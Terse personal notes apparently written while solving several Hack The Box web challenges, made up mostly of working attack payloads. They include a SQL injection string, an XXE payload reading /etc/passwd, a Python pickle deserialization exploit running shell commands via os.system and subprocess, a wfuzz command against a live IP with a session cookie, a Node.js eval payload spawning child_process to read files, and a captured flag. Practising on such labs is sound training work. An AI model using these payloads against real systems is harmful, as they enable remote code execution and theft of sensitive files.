' OR 1=1;--

baby nginxatsu: --> get hash password file
Extracting tar.gz File - tar -xf archive.tar.gz
Open sqlite file - https://sqlitebrowser.org/  - sudo apt-get -y install sqlite3  ILI sudo apt install sqlitebrowser  - sudo apt-get remove sqlite3 
john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/md5decryptor-uk.txt --format=Raw-MD5 hash.txt

baby WAFfles order***************************xml injection

Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
<food>&xxe;</food>
</order>

baby website rick ****************************** Insecure deserialization
https://ir0nstone.gitbook.io/hackthebox/challenges/web/baby-website-rick
https://docs.python.org/3/library/pickle.html
https://davidhamann.de/2020/04/05/exploiting-python-pickle/  -- useful blog

echo 'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu' | base64 -d  ->cookie on home page

test-deserialize.py---
import pickle
import pickletools
import base64
import os
import subprocess

from base64 import b64decode

import pickle

class anti_pickle_serum(object):
    def __init__(self):
        pass

code = b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'
#anti_pickle_serum = 'test'
serum = pickle.loads(b64decode(code))
print(serum)
--------------------
exploit.py***

#!/bin/bash/env python3 

from base64 import b64encode

import pickle
import os
import subprocess

class anti_pickle_serum(object):
    def __reduce__(self):               # function called by the pickler
        return os.system, (['whoami'],)

code = pickle.dumps({'serum': anti_pickle_serum()})
code = b64encode(code)
print(code)    

2. add - code = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
3. add - return subprocess.check_output, (['ls'],)
4. change  return subprocess.check_output, (['cat', 'flag_wIp1b'],)
------

baby todo or not todo**************************************
https://hilb3r7.github.io/walkthroughs/babybreakinggrad.html
wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt -u http://167.99.202.193:31961/api/list/FUZZ/?secret=userceF7EC55 -H "Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXJBRWViMTE2RiJ9.YUuLGg.8hb4Rle7WzIlDcAQzwrJKgVauzY" --hh 24

Util.py
browser -> http://167.99.202.193:31961/api/list/all/?secret=1B99c23095B8225

********************************************baby website rick *********
https://ir0nstone.gitbook.io/hackthebox/challenges/web/baby-website-rick
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

HTB{g00d_j0b_m0rty...n0w_I_h4v3_to_g0_to_f4m1ly_th3r4py..}

************************************baby breaking grad*********

https://blog.ch4n3.kr/531
api/calculate
https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1071860

add in Burp Repeater body:
{
  "name":"2",
  "formula": "(function (x) { return `${eval(\"console.log(global.process.mainModule.constructor._load('child_process').execSync(exam).toString())\")}` })()",
  "exam":"$(cat /app/flag*)"
}

--------------------------------------------------------------------------------------------------------------------------------------------------
